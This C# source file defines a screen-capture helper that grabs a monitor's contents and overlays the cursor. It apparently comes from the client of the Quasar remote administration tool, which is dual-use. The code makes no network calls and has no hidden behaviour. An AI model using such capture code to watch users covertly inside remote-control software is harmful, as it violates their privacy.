using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            Point cursorPosition;
            Bitmap cursorBitmap;
            CaptureCursor(out cursorPosition, out cursorBitmap, bounds);

            using (Graphics g = Graphics.FromImage(screen))
            {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                g.DrawImage(cursorBitmap, new Rectangle(cursorPosition, cursorBitmap.Size));
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

        private static void CaptureCursor(out Point cursorPosition, out Bitmap cursorBitmap, Rectangle bounds)
        {
            Cursor cursor = Cursors.Default;
            cursorPosition = Cursor.Position;
            cursorPosition.Offset(-bounds.X, -bounds.Y);

            cursorBitmap = new Bitmap(cursor.Size.Width, cursor.Size.Height);
            using (Graphics g = Graphics.FromImage(cursorBitmap))
            {
                cursor.Draw(g, new Rectangle(Point.Empty, cursor.Size));
            }
        }
    }
}
